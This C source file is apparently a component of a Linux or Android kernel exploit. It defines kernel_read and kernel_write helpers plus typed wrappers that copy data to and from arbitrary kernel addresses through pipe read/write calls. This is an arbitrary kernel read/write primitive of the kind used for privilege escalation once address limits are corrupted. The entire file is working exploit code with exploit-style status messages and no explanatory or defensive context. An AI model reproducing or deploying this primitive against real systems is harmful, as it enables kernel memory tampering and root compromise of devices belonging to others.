#include "include/kernel_rw.h"


bool kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
    bool rw_succeed = true;
    int kernel_rw_pipe[2] = {0};

    int retPipe = pipe(kernel_rw_pipe);
    if (retPipe == -1) {
        printf("[-] Pipe creation failed\n");
        return false;
    }
    if (len > 0x1000)
        printf("[!] kernel writes over PAGE_SIZE are messy, tried 0x%lx\n", len);

    if (write(kernel_rw_pipe[1], buf, len) != len) {
        printf("[-] kernel_write failed to load userspace buffer\n");
        rw_succeed = false;
        goto done;
    }

    if (read(kernel_rw_pipe[0], (void *) kaddr, len) != len) {
        printf("[-] kernel_write failed to overwrite kernel memory\n");
        rw_succeed = false;
        goto done;
    }

    done:
    close(kernel_rw_pipe[0]);
    close(kernel_rw_pipe[1]);
    return rw_succeed;
}

bool kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
    bool rw_succeed = true;
    int kernel_rw_pipe[2] = {0};

    int retPipe = pipe(kernel_rw_pipe);
    if (retPipe == -1) {
        printf("[-] Pipe creation failed\n");
        return false;
    }
    if (len > 0x1000)
        printf("[!] Kernel writes over PAGE_SIZE are messy, tried 0x%lx\n", len);

    if (write(kernel_rw_pipe[1], (void *) kaddr, len) != len) {
        printf("[-] Kernel_read failed to read kernel memory\n");
        rw_succeed = false;
        goto done;
    }

    if (read(kernel_rw_pipe[0], buf, len) != len) {
        printf("[-] Kernel_read failed to write out to userspace\n");
        rw_succeed = false;
        goto done;
    }

    done:
    close(kernel_rw_pipe[0]);
    close(kernel_rw_pipe[1]);
    return rw_succeed;
}

unsigned long kernel_read_uchar(unsigned long kaddr) {
    // printf("[+] Reading at: 0x%lx \n", kaddr);
    unsigned char data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}

unsigned long kernel_read_uint(unsigned long kaddr) {
    // printf("[+] Reading at: 0x%lx \n", kaddr);
    unsigned int data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}

unsigned long kernel_read_ulong(unsigned long kaddr) {
    // printf("[+] Reading at: 0x%lx \n", kaddr);
    unsigned long data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}

void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
    kernel_write(kaddr, &data, sizeof(data));
}

void kernel_write_ulong(unsigned long kaddr, unsigned long data) {
    kernel_write(kaddr, &data, sizeof(data));
}

void kernel_write_uint(unsigned long kaddr, unsigned int data) {
    kernel_write(kaddr, &data, sizeof(data));
}
